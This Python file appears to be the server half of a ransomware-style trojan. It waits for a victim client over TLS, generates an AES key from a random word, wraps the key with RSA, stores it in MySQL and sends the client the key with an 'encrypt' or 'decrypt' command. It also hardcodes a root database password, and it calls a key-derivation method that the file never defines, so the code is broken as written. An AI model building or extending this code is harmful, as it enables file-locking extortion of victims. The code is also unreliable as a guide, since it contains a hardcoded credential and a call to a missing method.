import os
import socket
import ssl
import mysql.connector
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
import base64
from random_word import RandomWords
import protocol

class SecureSocketServer:
    def __init__(self, host, port, cert, key):
        self.host = host
        self.port = port
        self.cert = cert
        self.key = key
        self.context = self._create_ssl_context()

    def _create_ssl_context(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=self.cert, keyfile=self.key)
        return ctx

    def wait_for_client(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.bind((self.host, self.port))
            sock.listen(1)
            with self.context.wrap_socket(sock, server_side=True) as ssock:
                conn, addr = ssock.accept()
                print(f"[+] Connected from {addr}")
                return conn
            
class KeyManager:
    def generate_aes_key_from_secret_word(self, word):
        hasher = SHA256.new()
        hasher.update(word.encode())
        return hasher.digest()

    def encrypt_aes_key_with_rsa(self, aes_key, public_key_path="server_RSA_public.pem"):
        with open(public_key_path, "rb") as f:
            pub = RSA.import_key(f.read())
        cipher = PKCS1_OAEP.new(pub)
        return base64.b64encode(cipher.encrypt(aes_key)).decode()

    def decrypt_aes_key_with_rsa(self, enc_b64, private_key_path="server_RSA_private.pem"):
        with open(private_key_path, "rb") as f:
            priv = RSA.import_key(f.read())
        cipher = PKCS1_OAEP.new(priv)
        return cipher.decrypt(base64.b64decode(enc_b64))

    def get_random_word(self):
        return RandomWords().get_random_word()
    
    
class SQLDatabaseManager:
    def __init__(self, db_name="my_server_trojan"):
        self.config = {
            "host": "localhost",
            "user": "root",
            "password": "Galking22!!!",
            "database": db_name
        }

    def save_key(self, key_b64):
        conn = mysql.connector.connect(**self.config)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO encrypted_keys (encrypted_key) VALUES (%s)", (key_b64,))
        conn.commit()
        cursor.close()
        conn.close()

    def get_last_key(self):
        conn = mysql.connector.connect(**self.config)
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_key FROM encrypted_keys ORDER BY id DESC LIMIT 1")
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        return result[0] if result else None
    
    
class TrojanServer:
    def __init__(self, action, conn):
        self.action = action
        self.conn = conn
        self.db = SQLDatabaseManager()
        self.keys = KeyManager()

    def run(self):
        if self.action == "encrypt":
            aes_key = self.generate_and_store_key()
        else:
            aes_key = self.load_and_decrypt_key()

        protocol.send(self.conn, aes_key)
        protocol.send(self.conn, self.action)

        data = protocol.receive(self.conn)
        decoded_data = data.decode()

        print(decoded_data)

    def generate_and_store_key(self):
        word = self.keys.get_random_word()
        aes_key = self.keys.derive_key_from_word(word)
        encrypted = self.keys.encrypt_aes_key_with_rsa(aes_key)
        self.db.save_key(encrypted)
        return aes_key

    def load_and_decrypt_key(self):
        encrypted_key = self.db.get_last_key()
        aes_key = self.keys.decrypt_aes_key_with_rsa(encrypted_key)
        return aes_key
    
    
if __name__ == "__main__":
    HOST = "0.0.0.0"
    PORT = 44444
    CERT = "path/to/cert.pem"
    KEY = "path/to/key.pem"
    action = "encrypt"  # enter "encrypt" or " decrypt" manually

    conn = SecureSocketServer(HOST, PORT, CERT, KEY).wait_for_client()
    with conn:
        TrojanServer(action, conn).run()